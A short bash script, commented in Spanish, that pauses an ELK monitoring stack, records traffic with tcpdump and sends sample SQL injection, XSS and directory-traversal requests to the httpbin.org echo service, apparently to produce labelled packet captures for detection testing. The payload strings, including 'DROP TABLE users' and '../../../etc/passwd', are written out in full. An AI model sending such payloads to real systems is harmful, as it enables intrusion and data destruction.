#!/bin/bash

echo "🔥 Generando ataques HTTP específicos..."

# Parar servicios que generen ruido
echo "⏸️  Pausando servicios para capturas limpias..."
sudo docker-compose -f ~/elk-monitoring/docker-compose.yml pause 2>/dev/null || true

# 1. SQL Injection con captura más larga
echo "💉 Capturando SQL Injection (30 segundos)..."
sudo tcpdump -i any -w ../captures/sql-attack.pcap port 80 or port 443 &
TCPDUMP_PID=$!

sleep 2

# Múltiples requests HTTP con SQL injection
echo "Enviando requests maliciosos..."
curl -v "http://httpbin.org/get?id=1' UNION SELECT password FROM users--" &
curl -v "http://httpbin.org/get?user=admin' OR '1'='1'--" &
curl -v "http://httpbin.org/post" -d "username=admin'; DROP TABLE users;--" &

# XSS attacks
curl -v "http://httpbin.org/get?search=<script>alert('XSS')</script>" &
curl -v "http://httpbin.org/get?input=<img src=x onerror=alert(1)>" &

# Directory traversal
curl -v "http://httpbin.org/get?file=../../../etc/passwd" &

# Esperar que todas las requests terminen
wait

sleep 5
sudo kill $TCPDUMP_PID 2>/dev/null

echo "✅ Ataque HTTP capturado!"

# Reiniciar servicios
echo "▶️  Reanudando servicios..."
sudo docker-compose -f ~/elk-monitoring/docker-compose.yml unpause 2>/dev/null || true

echo "📊 Analizando captura..."
echo "Total packets: $(tshark -r ../captures/sql-attack.pcap | wc -l)"
echo "HTTP requests: $(tshark -r ../captures/sql-attack.pcap -Y 'http.request' | wc -l)"
